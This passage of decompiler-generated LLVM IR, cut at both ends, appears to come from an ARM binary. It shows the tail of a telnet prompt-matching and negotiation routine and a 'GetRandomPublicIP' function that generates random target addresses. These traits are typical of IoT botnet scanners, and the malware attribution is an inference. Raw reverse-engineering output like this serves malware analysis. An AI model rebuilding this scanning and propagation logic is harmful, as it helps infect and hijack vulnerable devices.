  br i1 %tmp31, label %dec_label_pc_aa5c, label %dec_label_pc_a8e0

dec_label_pc_a8e0:                                ; preds = %dec_label_pc_a860
  %v2_a8ec = add i32 %stack_var_-40.0, %arg6
  %v5_a8f0 = inttoptr i32 %v2_a8ec to i8*
  %v6_a904 = inttoptr i32 %v2_a8ec to i32*
  %v7_a904 = call i32 @__libc_recv(i32 %arg1, i32* %v6_a904, i32 1, i32 0, i32 %v2_a8ec)
  %v7_a914 = icmp eq i32 %v7_a904, -1
  br i1 %v7_a914, label %dec_label_pc_a928, label %dec_label_pc_a91c

dec_label_pc_a91c:                                ; preds = %dec_label_pc_a8e0
  %v2_a920 = icmp eq i32 %v7_a904, 0
  br i1 %v2_a920, label %dec_label_pc_a928, label %dec_label_pc_a934

dec_label_pc_a928:                                ; preds = %dec_label_pc_a91c, %dec_label_pc_a8e0
  br label %dec_label_pc_aa64

dec_label_pc_a934:                                ; preds = %dec_label_pc_a91c
  %v2_a93c = add i32 %v7_a904, %stack_var_-40.0
  %v2_a948 = load i8, i8* %v5_a8f0, align 1
  %v2_a94c = icmp eq i8 %v2_a948, -1
  br i1 %v2_a94c, label %dec_label_pc_a954, label %dec_label_pc_a9d4

dec_label_pc_a954:                                ; preds = %dec_label_pc_a934
  %v1_a958 = add i32 %v2_a8ec, 1
  %v5_a96c = inttoptr i32 %v1_a958 to i32*
  %v6_a96c = call i32 @__libc_recv(i32 %arg1, i32* %v5_a96c, i32 2, i32 0, i32 %v2_a93c)
  %v7_a97c = icmp eq i32 %v6_a96c, -1
  br i1 %v7_a97c, label %dec_label_pc_a990, label %dec_label_pc_a984

dec_label_pc_a984:                                ; preds = %dec_label_pc_a954
  %v2_a988 = icmp eq i32 %v6_a96c, 0
  br i1 %v2_a988, label %dec_label_pc_a990, label %dec_label_pc_a99c

dec_label_pc_a990:                                ; preds = %dec_label_pc_a984, %dec_label_pc_a954
  br label %dec_label_pc_aa64

dec_label_pc_a99c:                                ; preds = %dec_label_pc_a984
  %v2_a9a4 = add i32 %v6_a96c, %v2_a93c
  %v5_a9b8 = call i32 @negotiate(i32 %arg1, i32 %v2_a8ec, i32 3, i32 %v2_a9a4, i32 %v2_a9a4)
  %v2_a9c0 = icmp eq i32 %v5_a9b8, 0
  br i1 %v2_a9c0, label %dec_label_pc_a9c8, label %dec_label_pc_aa18

dec_label_pc_a9c8:                                ; preds = %dec_label_pc_a99c
  br label %dec_label_pc_aa64

dec_label_pc_a9d4:                                ; preds = %dec_label_pc_a934
  %v7_a9dc = call i32 @strstr(i32 %arg6, i8* %v6_a9dc)
  %v2_a9e4 = icmp eq i32 %v7_a9dc, 0
  br i1 %v2_a9e4, label %dec_label_pc_a9ec, label %dec_label_pc_aa50

dec_label_pc_a9ec:                                ; preds = %dec_label_pc_a9d4
  br i1 %v2_a9f0, label %dec_label_pc_aa18, label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_a9ec
  %v2_a9fc = call i32 @matchPrompt(i8* %v1_a9fc)
  %v2_aa04 = icmp eq i32 %v2_a9fc, 0
  br i1 %v2_aa04, label %dec_label_pc_aa18, label %dec_label_pc_aa50

dec_label_pc_aa18:                                ; preds = %dec_label_pc_a99c, %dec_label_pc_a9f8, %dec_label_pc_a9ec, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a9a4, %dec_label_pc_a99c ], [ %v2_a93c, %dec_label_pc_a9ec ], [ %v2_a93c, %dec_label_pc_a9f8 ]
  %v1_aa1c = add i32 %stack_var_-40.0, 2
  %v6_aa28 = icmp slt i32 %v1_aa1c, %arg7
  br i1 %v6_aa28, label %dec_label_pc_aa2c, label %dec_label_pc_aa5c

dec_label_pc_aa2c:                                ; preds = %dec_label_pc_aa18
  %v3_aa2c = load i32, i32* %stack_var_-176, align 4
  %v5_aa34 = icmp sgt i32 %v3_aa2c, 0
  br i1 %v5_aa34, label %dec_label_pc_a838.lr.ph, label %dec_label_pc_aa38

dec_label_pc_aa38:                                ; preds = %dec_label_pc_aa2c
  br i1 %v5_aa40, label %dec_label_pc_a838.lr.ph, label %dec_label_pc_aa5c

dec_label_pc_aa50:                                ; preds = %dec_label_pc_a9d4, %dec_label_pc_a9f8
  br label %dec_label_pc_aa64

dec_label_pc_aa5c:                                ; preds = %dec_label_pc_a860, %dec_label_pc_aa38, %dec_label_pc_aa18
  br label %dec_label_pc_aa64

dec_label_pc_aa64:                                ; preds = %dec_label_pc_aa50, %dec_label_pc_a9c8, %dec_label_pc_a990, %dec_label_pc_a928, %dec_label_pc_aa5c
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_aa5c ], [ 1, %dec_label_pc_aa50 ], [ 0, %dec_label_pc_a928 ], [ 0, %dec_label_pc_a990 ], [ 0, %dec_label_pc_a9c8 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v6_a96c, { 1, 2, 0 }
  uselistorder i32 %v7_a904, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a824, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_aa64, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_aa5c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_aa50, { 1, 0 }
  uselistorder label %dec_label_pc_aa18, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a838, { 1, 0 }
  uselistorder label %dec_label_pc_a838.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_aa78 = load i32, i32* @fp, align 4
  store i32 43648, i32* %stack_var_-4, align 4
  %v2_aa7c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_aa7c, i32* @fp, align 4
  %v2_aa80 = ptrtoint i32* %stack_var_-36 to i32
  store i8 0, i8* @global_var_2c91f.80, align 1
  store i8 0, i8* @global_var_2c920.81, align 1
  store i8 0, i8* @global_var_2c921.82, align 1
  store i8 0, i8* @global_var_2c922.83, align 1
  %v0_aab4 = call i32 @random()
  %v2_aac4 = srem i32 %v0_aab4, 255
  %v1_aad4 = trunc i32 %v2_aac4 to i8
  store i8 %v1_aad4, i8* @global_var_2c91f.80, align 1
  %v0_aad8 = call i32 @random()
  %v2_aae8 = srem i32 %v0_aad8, 255
  %v1_aaf8 = trunc i32 %v2_aae8 to i8
  store i8 %v1_aaf8, i8* @global_var_2c920.81, align 1
  %v0_aafc = call i32 @random()
  %v2_ab0c = srem i32 %v0_aafc, 255
  %v1_ab1c = trunc i32 %v2_ab0c to i8
  store i8 %v1_ab1c, i8* @global_var_2c921.82, align 1
  %v0_ab20 = call i32 @random()
  %v2_ab30 = srem i32 %v0_ab20, 255
  %v1_ab40 = trunc i32 %v2_ab30 to i8
  store i8 %v1_ab40, i8* @global_var_2c922.83, align 1
  %v0_ab44 = call i32 @random()
  %v2_ab54 = srem i32 %v0_ab44, 115
  %v2_ab64 = icmp eq i32 %v2_ab54, 0
  br i1 %v2_ab64, label %dec_label_pc_ab6c, label %dec_label_pc_ab94

dec_label_pc_ab6c:                                ; preds = %entry
  %v3_ab78 = load i8, i8* @global_var_2c921.82, align 1
  %v3_ab84 = load i8, i8* @global_var_2c922.83, align 1
  %v4_ab90 = sext i8 %v3_ab78 to i32
  %v6_ab90 = sext i8 %v3_ab84 to i32
  %v8_ab90 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a718.85 to i32), i32 %v4_ab90, i32 %v6_ab90, i32 0)
  br label %dec_label_pc_ab94

dec_label_pc_ab94:                                ; preds = %entry, %dec_label_pc_ab6c
  %v7_ab98 = icmp eq i32 %v2_ab54, 1
  br i1 %v7_ab98, label %dec_label_pc_aba0, label %dec_label_pc_abc8

dec_label_pc_aba0:                                ; preds = %dec_label_pc_ab94
  %v3_abac = load i8, i8* @global_var_2c921.82, align 1
  %v3_abb8 = load i8, i8* @global_var_2c922.83, align 1
  %v4_abc4 = sext i8 %v3_abac to i32
  %v6_abc4 = sext i8 %v3_abb8 to i32
  %v8_abc4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a728.87 to i32), i32 %v4_abc4, i32 %v6_abc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abc8

dec_label_pc_abc8:                                ; preds = %dec_label_pc_ab94, %dec_label_pc_aba0
  %v7_abcc = icmp eq i32 %v2_ab54, 2
  br i1 %v7_abcc, label %dec_label_pc_abd4, label %dec_label_pc_abfc

dec_label_pc_abd4:                                ; preds = %dec_label_pc_abc8
  %v3_abe0 = load i8, i8* @global_var_2c921.82, align 1
  %v3_abec = load i8, i8* @global_var_2c922.83, align 1
  %v4_abf8 = sext i8 %v3_abe0 to i32
  %v6_abf8 = sext i8 %v3_abec to i32
  %v8_abf8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1a738.89 to i32), i32 %v4_abf8, i32 %v6_abf8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abfc

dec_label_pc_abfc:                                ; preds = %dec_label_pc_abc8, %dec_label_pc_abd4
  %v7_ac00 = icmp eq i32 %v2_ab54, 3
  br i1 %v7_ac00, label %dec_label_pc_ac08, label %dec_label_pc_ac30

dec_label_pc_ac08:                                ; preds = %dec_label_pc_abfc
  %v3_ac14 = load i8, i8* @global_var_2c921.82, align 1
  %v3_ac20 = load i8, i8* @global_var_2c922.83, align 1
  %v4_ac2c = sext i8 %v3_ac14 to i32
  %v6_ac2c = sext i8 %v3_ac20 to i32
  %v8_ac2c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a744.91 to i32), i32 %v4_ac2c, i32 %v6_ac2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac30

dec_label_pc_ac30:                                ; preds = %dec_label_pc_abfc, %dec_label_pc_ac08
  %v7_ac34 = icmp eq i32 %v2_ab54, 4
  br i1 %v7_ac34, label %dec_label_pc_ac3c, label %dec_label_pc_ac64

dec_label_pc_ac3c:                                ; preds = %dec_label_pc_ac30
  %v3_ac48 = load i8, i8* @global_var_2c921.82, align 1
  %v3_ac54 = load i8, i8* @global_var_2c922.83, align 1
  %v4_ac60 = sext i8 %v3_ac48 to i32
  %v6_ac60 = sext i8 %v3_ac54 to i32
  %v8_ac60 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1a754.93 to i32), i32 %v4_ac60, i32 %v6_ac60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac64

dec_label_pc_ac64:                                ; preds = %dec_label_pc_ac30, %dec_label_pc_ac3c
  %v7_ac68 = icmp eq i32 %v2_ab54, 5
  br i1 %v7_ac68, label %dec_label_pc_ac70, label %dec_label_pc_ac98

dec_label_pc_ac70:                                ; preds = %dec_label_pc_ac64
  %v3_ac7c = load i8, i8* @global_var_2c921.82, align 1
  %v3_ac88 = load i8, i8* @global_var_2c922.83, align 1
  %v4_ac94 = sext i8 %v3_ac7c to i32
  %v6_ac94 = sext i8 %v3_ac88 to i32
  %v8_ac94 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a760.95 to i32), i32 %v4_ac94, i32 %v6_ac94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac98

dec_label_pc_ac98:                                ; preds = %dec_label_pc_ac64, %dec_label_pc_ac70
  %v7_ac9c = icmp eq i32 %v2_ab54, 6
  br i1 %v7_ac9c, label %dec_label_pc_aca4, label %dec_label_pc_accc

dec_label_pc_aca4:                                ; preds = %dec_label_pc_ac98
  %v3_acb0 = load i8, i8* @global_var_2c921.82, align 1
  %v3_acbc = load i8, i8* @global_var_2c922.83, align 1
  %v4_acc8 = sext i8 %v3_acb0 to i32
  %v6_acc8 = sext i8 %v3_acbc to i32
  %v8_acc8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a770.97 to i32), i32 %v4_acc8, i32 %v6_acc8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_accc

dec_label_pc_accc:                                ; preds = %dec_label_pc_ac98, %dec_label_pc_aca4
  %v7_acd0 = icmp eq i32 %v2_ab54, 7
  br i1 %v7_acd0, label %dec_label_pc_acd8, label %dec_label_pc_ad00

dec_label_pc_acd8:                                ; preds = %dec_label_pc_accc
  %v3_ace4 = load i8, i8* @global_var_2c921.82, align 1
  %v3_acf0 = load i8, i8* @global_var_2c922.83, align 1
  %v4_acfc = sext i8 %v3_ace4 to i32
  %v6_acfc = sext i8 %v3_acf0 to i32
  %v8_acfc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a77c.99 to i32), i32 %v4_acfc, i32 %v6_acfc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad00

dec_label_pc_ad00:                                ; preds = %dec_label_pc_accc, %dec_label_pc_acd8
  %v7_ad04 = icmp eq i32 %v2_ab54, 8
  br i1 %v7_ad04, label %dec_label_pc_ad0c, label %dec_label_pc_ad34

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad00
  %v3_ad18 = load i8, i8* @global_var_2c921.82, align 1
  %v3_ad24 = load i8, i8* @global_var_2c922.83, align 1
  %v4_ad30 = sext i8 %v3_ad18 to i32
  %v6_ad30 = sext i8 %v3_ad24 to i32
  %v8_ad30 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a78c.101 to i32), i32 %v4_ad30, i32 %v6_ad30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad34

dec_label_pc_ad34:                                ; preds = %dec_label_pc_ad00, %dec_label_pc_ad0c
  %v7_ad38 = icmp eq i32 %v2_ab54, 9
  br i1 %v7_ad38, label %dec_label_pc_ad40, label %dec_label_pc_ad68

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad34
  %v3_ad4c = load i8, i8* @global_var_2c921.82, align 1
  %v3_ad58 = load i8, i8* @global_var_2c922.83, align 1
  %v4_ad64 = sext i8 %v3_ad4c to i32
  %v6_ad64 = sext i8 %v3_ad58 to i32
  %v8_ad64 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a79c.103 to i32), i32 %v4_ad64, i32 %v6_ad64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad68

dec_label_pc_ad68:                                ; preds = %dec_label_pc_ad34, %dec_label_pc_ad40
  %v7_ad6c = icmp eq i32 %v2_ab54, 10
  br i1 %v7_ad6c, label %dec_label_pc_ad74, label %dec_label_pc_ad9c

dec_label_pc_ad74:                                ; preds = %dec_label_pc_ad68
  %v3_ad80 = load i8, i8* @global_var_2c921.82, align 1
  %v3_ad8c = load i8, i8* @global_var_2c922.83, align 1
  %v4_ad98 = sext i8 %v3_ad80 to i32
  %v6_ad98 = sext i8 %v3_ad8c to i32
  %v8_ad98 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a7ac.105 to i32), i32 %v4_ad98, i32 %v6_ad98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad9c

dec_label_pc_ad9c:                                ; preds = %dec_label_pc_ad68, %dec_label_pc_ad74
  %v7_ada0 = icmp eq i32 %v2_ab54, 11
  br i1 %v7_ada0, label %dec_label_pc_ada8, label %dec_label_pc_add0

dec_label_pc_ada8:                                ; preds = %dec_label_pc_ad9c
  %v3_adb4 = load i8, i8* @global_var_2c921.82, align 1
  %v3_adc0 = load i8, i8* @global_var_2c922.83, align 1
  %v4_adcc = sext i8 %v3_adb4 to i32
  %v6_adcc = sext i8 %v3_adc0 to i32
  %v8_adcc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1a7bc.107 to i32), i32 %v4_adcc, i32 %v6_adcc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_add0

dec_label_pc_add0:                                ; preds = %dec_label_pc_ad9c, %dec_label_pc_ada8
  %v7_add4 = icmp eq i32 %v2_ab54, 12
  br i1 %v7_add4, label %dec_label_pc_addc, label %dec_label_pc_ae04

dec_label_pc_addc:                                ; preds = %dec_label_pc_add0
  %v3_ade8 = load i8, i8* @global_var_2c921.82, align 1
  %v3_adf4 = load i8, i8* @global_var_2c922.83, align 1
  %v4_ae00 = sext i8 %v3_ade8 to i32
  %v6_ae00 = sext i8 %v3_adf4 to i32
  %v8_ae00 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a728.87 to i32), i32 %v4_ae00, i32 %v6_ae00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae04

dec_label_pc_ae04:                                ; preds = %dec_label_pc_add0, %dec_label_pc_addc
  %v7_ae08 = icmp eq i32 %v2_ab54, 13
  br i1 %v7_ae08, label %dec_label_pc_ae10, label %dec_label_pc_ae38

dec_label_pc_ae10:                                ; preds = %dec_label_pc_ae04
  %v3_ae1c = load i8, i8* @global_var_2c921.82, align 1
  %v3_ae28 = load i8, i8* @global_var_2c922.83, align 1
  %v4_ae34 = sext i8 %v3_ae1c to i32
  %v6_ae34 = sext i8 %v3_ae28 to i32
  %v8_ae34 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a7c8.109 to i32), i32 %v4_ae34, i32 %v6_ae34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae38

dec_label_pc_ae38:                                ; preds = %dec_label_pc_ae04, %dec_label_pc_ae10
  %v7_ae3c = icmp eq i32 %v2_ab54, 14
  br i1 %v7_ae3c, label %dec_label_pc_ae44, label %dec_label_pc_ae6c

dec_label_pc_ae44:                                ; preds = %dec_label_pc_ae38
  %v3_ae50 = load i8, i8* @global_var_2c921.82, align 1
  %v3_ae5c = load i8, i8* @global_var_2c922.83, align 1
  %v4_ae68 = sext i8 %v3_ae50 to i32
  %v6_ae68 = sext i8 %v3_ae5c to i32
  %v8_ae68 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a7d8.111 to i32), i32 %v4_ae68, i32 %v6_ae68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae6c

dec_label_pc_ae6c:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ae44
  %v7_ae70 = icmp eq i32 %v2_ab54, 15
  br i1 %v7_ae70, label %dec_label_pc_ae78, label %dec_label_pc_aea0

dec_label_pc_ae78:                                ; preds = %dec_label_pc_ae6c
  %v3_ae84 = load i8, i8* @global_var_2c921.82, align 1
  %v3_ae90 = load i8, i8* @global_var_2c922.83, align 1
  %v4_ae9c = sext i8 %v3_ae84 to i32
  %v6_ae9c = sext i8 %v3_ae90 to i32
  %v8_ae9c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a7e8.113 to i32), i32 %v4_ae9c, i32 %v6_ae9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aea0

dec_label_pc_aea0:                                ; preds = %dec_label_pc_ae6c, %dec_label_pc_ae78
  %v7_aea4 = icmp eq i32 %v2_ab54, 16
  br i1 %v7_aea4, label %dec_label_pc_aeac, label %dec_label_pc_aed4

dec_label_pc_aeac:                                ; preds = %dec_label_pc_aea0
  %v3_aeb8 = load i8, i8* @global_var_2c921.82, align 1
  %v3_aec4 = load i8, i8* @global_var_2c922.83, align 1
  %v4_aed0 = sext i8 %v3_aeb8 to i32
  %v6_aed0 = sext i8 %v3_aec4 to i32
  %v8_aed0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a7f8.115 to i32), i32 %v4_aed0, i32 %v6_aed0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aed4

dec_label_pc_aed4:                                ; preds = %dec_label_pc_aea0, %dec_label_pc_aeac
  %v7_aed8 = icmp eq i32 %v2_ab54, 17
  br i1 %v7_aed8, label %dec_label_pc_aee0, label %dec_label_pc_af08

dec_label_pc_aee0:                                ; preds = %dec_label_pc_aed4
  %v3_aeec = load i8, i8* @global_var_2c921.82, align 1
  %v3_aef8 = load i8, i8* @global_var_2c922.83, align 1
  %v4_af04 = sext i8 %v3_aeec to i32
  %v6_af04 = sext i8 %v3_aef8 to i32
  %v8_af04 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a808.117 to i32), i32 %v4_af04, i32 %v6_af04, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af08

dec_label_pc_af08:                                ; preds = %dec_label_pc_aed4, %dec_label_pc_aee0
  %v7_af0c = icmp eq i32 %v2_ab54, 18
  br i1 %v7_af0c, label %dec_label_pc_af14, label %dec_label_pc_af3c

dec_label_pc_af14:                                ; preds = %dec_label_pc_af08
  %v3_af20 = load i8, i8* @global_var_2c921.82, align 1
  %v3_af2c = load i8, i8* @global_var_2c922.83, align 1
  %v4_af38 = sext i8 %v3_af20 to i32
  %v6_af38 = sext i8 %v3_af2c to i32
  %v8_af38 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a818.119 to i32), i32 %v4_af38, i32 %v6_af38, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af3c

dec_label_pc_af3c:                                ; preds = %dec_label_pc_af08, %dec_label_pc_af14
  %v7_af40 = icmp eq i32 %v2_ab54, 19
  br i1 %v7_af40, label %dec_label_pc_af48, label %dec_label_pc_af70

dec_label_pc_af48:                                ; preds = %dec_label_pc_af3c
  %v3_af54 = load i8, i8* @global_var_2c921.82, align 1
  %v3_af60 = load i8, i8* @global_var_2c922.83, align 1
  %v4_af6c = sext i8 %v3_af54 to i32
  %v6_af6c = sext i8 %v3_af60 to i32
  %v8_af6c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1a828.121 to i32), i32 %v4_af6c, i32 %v6_af6c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af70

dec_label_pc_af70:                                ; preds = %dec_label_pc_af3c, %dec_label_pc_af48
  %v7_af74 = icmp eq i32 %v2_ab54, 20
  br i1 %v7_af74, label %dec_label_pc_af7c, label %dec_label_pc_afa4

dec_label_pc_af7c:                                ; preds = %dec_label_pc_af70
  %v3_af88 = load i8, i8* @global_var_2c921.82, align 1
  %v3_af94 = load i8, i8* @global_var_2c922.83, align 1
  %v4_afa0 = sext i8 %v3_af88 to i32
  %v6_afa0 = sext i8 %v3_af94 to i32
  %v8_afa0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a834.123 to i32), i32 %v4_afa0, i32 %v6_afa0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afa4

dec_label_pc_afa4:                                ; preds = %dec_label_pc_af70, %dec_label_pc_af7c
  %v7_afa8 = icmp eq i32 %v2_ab54, 21
  br i1 %v7_afa8, label %dec_label_pc_afb0, label %dec_label_pc_afd8

dec_label_pc_afb0:                                ; preds = %dec_label_pc_afa4
  %v3_afbc = load i8, i8* @global_var_2c921.82, align 1
  %v3_afc8 = load i8, i8* @global_var_2c922.83, align 1
  %v4_afd4 = sext i8 %v3_afbc to i32
  %v6_afd4 = sext i8 %v3_afc8 to i32
  %v8_afd4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a840.125 to i32), i32 %v4_afd4, i32 %v6_afd4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afd8

dec_label_pc_afd8:                                ; preds = %dec_label_pc_afa4, %dec_label_pc_afb0
  %v7_afdc = icmp eq i32 %v2_ab54, 22
  br i1 %v7_afdc, label %dec_label_pc_afe4, label %dec_label_pc_b00c

dec_label_pc_afe4:                                ; preds = %dec_label_pc_afd8
  %v3_aff0 = load i8, i8* @global_var_2c921.82, align 1
  %v3_affc = load i8, i8* @global_var_2c922.83, align 1
  %v4_b008 = sext i8 %v3_aff0 to i32
  %v6_b008 = sext i8 %v3_affc to i32
  %v8_b008 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1a850.127 to i32), i32 %v4_b008, i32 %v6_b008, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b00c

dec_label_pc_b00c:                                ; preds = %dec_label_pc_afd8, %dec_label_pc_afe4
  %v7_b010 = icmp eq i32 %v2_ab54, 23
  br i1 %v7_b010, label %dec_label_pc_b018, label %dec_label_pc_b040

dec_label_pc_b018:                                ; preds = %dec_label_pc_b00c
  %v3_b024 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b030 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b03c = sext i8 %v3_b024 to i32
  %v6_b03c = sext i8 %v3_b030 to i32
  %v8_b03c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1a85c.129 to i32), i32 %v4_b03c, i32 %v6_b03c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b040

dec_label_pc_b040:                                ; preds = %dec_label_pc_b00c, %dec_label_pc_b018
  %v7_b044 = icmp eq i32 %v2_ab54, 24
  br i1 %v7_b044, label %dec_label_pc_b04c, label %dec_label_pc_b074

dec_label_pc_b04c:                                ; preds = %dec_label_pc_b040
  %v3_b058 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b064 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b070 = sext i8 %v3_b058 to i32
  %v6_b070 = sext i8 %v3_b064 to i32
  %v8_b070 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a868.131 to i32), i32 %v4_b070, i32 %v6_b070, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b074

dec_label_pc_b074:                                ; preds = %dec_label_pc_b040, %dec_label_pc_b04c
  %v7_b078 = icmp eq i32 %v2_ab54, 25
  br i1 %v7_b078, label %dec_label_pc_b080, label %dec_label_pc_b0a8

dec_label_pc_b080:                                ; preds = %dec_label_pc_b074
  %v3_b08c = load i8, i8* @global_var_2c921.82, align 1
  %v3_b098 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b0a4 = sext i8 %v3_b08c to i32
  %v6_b0a4 = sext i8 %v3_b098 to i32
  %v8_b0a4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a874.133 to i32), i32 %v4_b0a4, i32 %v6_b0a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0a8

dec_label_pc_b0a8:                                ; preds = %dec_label_pc_b074, %dec_label_pc_b080
  %v7_b0ac = icmp eq i32 %v2_ab54, 26
  br i1 %v7_b0ac, label %dec_label_pc_b0b4, label %dec_label_pc_b0dc

dec_label_pc_b0b4:                                ; preds = %dec_label_pc_b0a8
  %v3_b0c0 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b0cc = load i8, i8* @global_var_2c922.83, align 1
  %v4_b0d8 = sext i8 %v3_b0c0 to i32
  %v6_b0d8 = sext i8 %v3_b0cc to i32
  %v8_b0d8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a880.135 to i32), i32 %v4_b0d8, i32 %v6_b0d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0dc

dec_label_pc_b0dc:                                ; preds = %dec_label_pc_b0a8, %dec_label_pc_b0b4
  %v7_b0e0 = icmp eq i32 %v2_ab54, 27
  br i1 %v7_b0e0, label %dec_label_pc_b0e8, label %dec_label_pc_b110

dec_label_pc_b0e8:                                ; preds = %dec_label_pc_b0dc
  %v3_b0f4 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b100 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b10c = sext i8 %v3_b0f4 to i32
  %v6_b10c = sext i8 %v3_b100 to i32
  %v8_b10c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a88c.137 to i32), i32 %v4_b10c, i32 %v6_b10c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b110

dec_label_pc_b110:                                ; preds = %dec_label_pc_b0dc, %dec_label_pc_b0e8
  %v7_b114 = icmp eq i32 %v2_ab54, 28
  br i1 %v7_b114, label %dec_label_pc_b11c, label %dec_label_pc_b144

dec_label_pc_b11c:                                ; preds = %dec_label_pc_b110
  %v3_b128 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b134 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b140 = sext i8 %v3_b128 to i32
  %v6_b140 = sext i8 %v3_b134 to i32
  %v8_b140 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a89c.139 to i32), i32 %v4_b140, i32 %v6_b140, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b144

dec_label_pc_b144:                                ; preds = %dec_label_pc_b110, %dec_label_pc_b11c
  %v7_b148 = icmp eq i32 %v2_ab54, 29
  br i1 %v7_b148, label %dec_label_pc_b150, label %dec_label_pc_b178

